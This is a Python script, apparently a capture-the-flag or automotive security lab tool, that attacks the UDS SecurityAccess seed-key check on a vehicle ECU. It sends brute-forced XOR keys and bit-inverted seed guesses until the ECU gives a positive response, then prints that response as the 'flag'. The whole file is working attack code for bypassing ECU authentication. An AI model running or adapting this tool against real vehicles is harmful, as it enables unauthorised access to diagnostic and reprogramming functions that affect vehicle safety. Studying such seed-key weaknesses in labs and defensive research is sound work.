import time
import read_response


def key_request(key_req, stack, timeout=1.0):
    """
    Sends a UDS key request and waits for the ECU's response.

    Parameters:
        key_req (bytes): The full UDS key request message.
        stack: An interface providing send, recv, process, and available methods.
        timeout (float): Time (in seconds) to wait for new frames before giving up.

    Returns:
        tuple: (found, candidate, responses)
            found (bool): True if a positive response was received.
            candidate (bytes): The candidate key extracted from key_req (assumes candidate is key_req[2:]).
            responses (list): All response frames received.
    """
    print(f"Sending UDS key request: {key_req.hex()}")
    stack.send(key_req)

    # Assume candidate key is the bytes after the first two header bytes.
    candidate = key_req[2:]
    last_frame_time = time.time()
    responses = []

    while True:
        stack.process()
        if stack.available():
            resp_data = stack.recv()
            responses.append(resp_data)
            print(f"Received response for candidate {candidate.hex()}: {resp_data.hex()}")
            last_frame_time = time.time()
        if time.time() - last_frame_time > timeout:
            break
        time.sleep(0.01)

    if responses:
        # A positive response is assumed when the first byte is not 0x7F.
        if responses[0][0] != 0x7F:
            flag = responses[0].hex(' ')[2:]
            print(f"\nKey found! Candidate key: {candidate.hex()}\nResponse: {flag}")
            print(f"Decoded data: {bytearray.fromhex(flag).decode('ascii', errors='replace')}")
            return True, candidate, responses
        else:
            print(read_response.process_ecu_response(responses[0]))
    return False, candidate, responses


def xor_key(seed, stack, key_send_bytes):
    """
    Generates candidate keys by XORing each byte value (0x00-0xFF) with the seed
    and sends them via the key_request helper function.

    Parameters:
        seed (bytes): The seed value.
        stack: Communication interface with required methods.
        key_send_bytes (bytes): UDS request header for sending a key.
    """
    try:
        for candidate in range(256):
            # Compute candidate key via XOR for each possible candidate.
            xor_value = bytes([b ^ candidate for b in seed])
            print(f"Candidate {candidate:02X}: {xor_value.hex()}")

            # Build the key request message.
            key_req = key_send_bytes + xor_value

            # Use the helper function to send and process the candidate key.
            found, candidate_key, responses = key_request(key_req, stack)
            if found:
                break
    except KeyboardInterrupt:
        print("\nKeyboard interrupt received. Aborting key scan.")


def invert_bits(seed, stack, service_bytes):
    """
    Inverts the bits of a hex string seed, builds the key request, and sends it.

    Parameters:
        seed (str): The seed as a hex string.
        stack: Communication interface with required methods.
        service_bytes (bytes): UDS request header for sending a key.
    """
    # Convert the hex string to an integer and determine its bit length.
    num = int(seed, 16)
    num_bits = len(seed) * 4  # Each hex digit represents 4 bits.

    # Perform bitwise inversion and format back to hex.
    inverted_num = ~num & ((1 << num_bits) - 1)
    inverted_seed = f'{inverted_num:0{len(seed)}X}'

    key_str = ' '.join([inverted_seed[i:i + 2] for i in range(0, len(inverted_seed), 2)])
    print(f"Original hex: {seed}")
    print(f"Bitwise inverted hex: {inverted_seed}")
    print(f"Key: {key_str}")

    # Convert the inverted seed back to bytes.
    inverted_bytes = bytes.fromhex(inverted_seed)
    key_req = service_bytes + inverted_bytes

    # Send the candidate key using the helper function.
    key_request(key_req, stack)
